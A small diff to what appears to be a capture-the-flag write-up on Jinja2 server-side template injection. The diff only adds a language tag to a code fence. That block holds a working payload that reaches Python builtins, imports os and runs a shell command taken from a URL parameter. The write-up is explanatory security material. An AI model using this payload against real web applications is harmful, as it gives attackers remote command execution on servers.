@@ -49,7 +49,7 @@ lets try running code on the machine.
 All of this is to get the `_` from the get parameter `us` and use it in the code, bcause underscores are blocked. 
 this is the code when you dont have the underscore blocker.
 {% raw %}
-```
+```py
 {{request|attr('application')|attr( "__globals__" ) |attr( "__getitem__" )( "__builtins__") |attr( "__getitem__")("__import__")('os')|attr('popen')(request|attr('args')|attr('get')('c'))|attr('read')()}}?c=
 ```
 {% endraw %}
